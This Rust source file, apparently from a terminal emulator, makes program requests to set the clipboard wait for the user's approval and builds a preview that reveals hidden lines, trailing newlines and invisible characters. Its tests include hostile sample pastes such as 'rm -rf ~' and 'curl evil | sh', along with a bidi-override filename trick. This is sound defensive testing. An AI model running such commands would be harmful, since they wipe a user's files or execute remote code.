//! A program in a terminal asks to set the clipboard (OSC 52): nothing is copied by itself. The ask
//! waits in its pane's header for the user's Copy, Always for this pane, or ×. A program asking to
//! read the clipboard is refused, silently.
//!
//! The user's answer is bound to the ask they saw: each ask has an id the answer must name, and
//! Copy does nothing until the ask has been on show `GUARD_MS`, so a program cannot put another
//! ask under the pointer just as the user clicks.

use serde::Serialize;

use crate::capture::{is_break as breaks, shows};

/// The most text a program may ask to copy, in bytes: a larger ask is refused, and says so.
pub const MOST: usize = 100 * 1024;
/// How long an ask is on show before its Copy and Always act: longer than a click, so a
/// replacement that lands under the pointer is seen before it can be taken.
pub const GUARD_MS: u64 = 500;
pub const USERS_ALONE: &str = "only the user answers a program's ask to copy";
pub const SHELLS_ALONE: &str = "only ottospace hears a program ask to copy";

/// A pane's waiting ask: how much, never what (the text is not in the state).
#[derive(Clone, Debug, Default, PartialEq, Serialize)]
pub struct Ask {
    /// Its own: an answer names it, and acts on no other.
    pub id: u64,
    /// When it came (ms): Copy acts from `at + GUARD_MS`.
    pub at: u64,
    /// The characters Copy would put on the clipboard, all of them (past the cap: those kept).
    pub chars: usize,
    /// Over `MOST` bytes: refused, nothing held; the user can only dismiss it.
    pub too_large: bool,
    #[serde(skip)]
    pub text: String,
}

impl Ask {
    pub fn new(id: u64, at: u64, text: String) -> Self {
        let chars = text.chars().count();
        let too_large = text.len() > MOST;
        Self { id, at, chars, too_large, text: if too_large { String::new() } else { text } }
    }

    /// Copy and Always act: on show long enough to have been seen.
    pub fn ready(&self, now: u64) -> bool {
        now >= self.at.saturating_add(GUARD_MS)
    }
}

/// The user's answer on the pill.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Answer {
    Copy,
    /// Copy, and this pane's later asks copy at once, while the pane lasts.
    Always,
    Dismiss,
}

/// What the pill shows of the text, and what that leaves out. Drawn only, never in the state.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Preview {
    /// The first line, at most `most` characters, each invisible or reordering character shown as `�`.
    pub shown: String,
    /// `shown` is not the whole text: more lines, more characters, or a character marked.
    pub partial: bool,
    pub lines: usize,
    /// It ends with a line break: pasted into a shell, its line runs.
    pub ends_with_newline: bool,
    /// Only spaces and line breaks.
    pub blank: bool,
}

/// The pill's view of `text`: e.g. `"ls -la\nrm x"` shows `ls -la`, partial, 2 lines.
pub fn preview(text: &str, most: usize) -> Preview {
    // CR LF is one line break.
    let text = &text.replace("\r\n", "\n");
    let first = text.split(breaks).next().unwrap_or_default();
    let mut marked = false;
    let mut shown = String::new();
    for c in first.chars().take(most) {
        if !shows(c) {
            marked = true;
            shown.push('\u{fffd}');
        } else {
            shown.push(c);
        }
    }
    let lines = text.split(breaks).count() - usize::from(text.ends_with(breaks));
    let ends_with_newline = text.ends_with(breaks);
    // Spaces and line breaks alone: an invisible character is marked, not called blank.
    let blank = text.chars().all(char::is_whitespace);
    let partial = marked || first.chars().count() > most || first.len() < text.len();
    Preview { shown, partial, lines: lines.max(1), ends_with_newline, blank }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_ask_holds_its_text_up_to_the_cap_and_acts_after_the_guard() {
        let ask = Ask::new(3, 1_000, "héllo".into());
        assert_eq!((ask.chars, ask.too_large, ask.text.as_str()), (5, false, "héllo"));
        assert!(!ask.ready(1_000 + GUARD_MS - 1) && ask.ready(1_000 + GUARD_MS));
        let large = Ask::new(4, 0, "x".repeat(MOST + 1));
        assert_eq!((large.chars, large.too_large, large.text.as_str()), (MOST + 1, true, ""), "refused, nothing held");
        assert!(!Ask::new(5, 0, "x".repeat(MOST)).too_large);
    }

    #[test]
    fn the_preview_says_when_it_is_not_the_whole_text() {
        let p = preview("ls -la\nrm -rf x", 40);
        assert_eq!((p.shown.as_str(), p.partial, p.lines, p.ends_with_newline), ("ls -la", true, 2, false));
        assert_eq!(preview("abcdef", 3).shown, "abc");
        assert!(preview("abcdef", 3).partial);
        let whole = preview("plain", 40);
        assert_eq!((whole.shown.as_str(), whole.partial, whole.lines, whole.blank), ("plain", false, 1, false));
    }

    /// A trailing newline runs the line when pasted into a shell: said plainly.
    #[test]
    fn a_trailing_newline_is_flagged() {
        let p = preview("rm -rf ~\n", 40);
        assert_eq!((p.shown.as_str(), p.partial, p.lines, p.ends_with_newline), ("rm -rf ~", true, 1, true));
    }

    /// U+2028, U+2029, NEL and CR break lines too: nothing after one hides on the first line.
    #[test]
    fn unicode_line_separators_break_the_line() {
        for sep in ['\u{2028}', '\u{2029}', '\u{85}', '\r'] {
            let p = preview(&format!("echo hi{sep}curl evil | sh"), 40);
            assert_eq!((p.shown.as_str(), p.partial, p.lines), ("echo hi", true, 2), "{sep:?}");
        }
    }

    /// A bidi override, a zero-width space or joiner, a BOM: each shown as �, and the preview partial.
    #[test]
    fn invisible_and_reordering_characters_are_marked() {
        let p = preview("echo \u{202e}txt.exe", 40);
        assert_eq!((p.shown.as_str(), p.partial), ("echo \u{fffd}txt.exe", true));
        let p = preview("a\u{200b}b\u{200d}c\u{feff}\u{2066}", 40);
        assert_eq!((p.shown.as_str(), p.partial), ("a\u{fffd}b\u{fffd}c\u{fffd}\u{fffd}", true));
        assert_eq!(preview("a\x1b[31mred", 40).shown, "a\u{fffd}[31mred");
    }

    #[test]
    fn a_blank_text_says_so() {
        for text in ["   ", "\n\n", " \t", ""] {
            assert!(preview(text, 40).blank, "{text:?}");
        }
        // Not blank: a letter, or a control or invisible character, which the preview marks.
        for text in [" a ", "\x1b", " \u{200b}"] {
            assert!(!preview(text, 40).blank, "{text:?}");
        }
        let joined = preview("a\u{34f}", 40);
        assert_eq!((joined.shown.as_str(), joined.partial), ("a\u{fffd}", true), "a grapheme joiner");
    }

    #[test]
    fn cr_lf_is_one_line_break() {
        let p = preview("one\r\ntwo\r\n", 40);
        assert_eq!((p.shown.as_str(), p.lines, p.ends_with_newline), ("one", 2, true));
    }
}
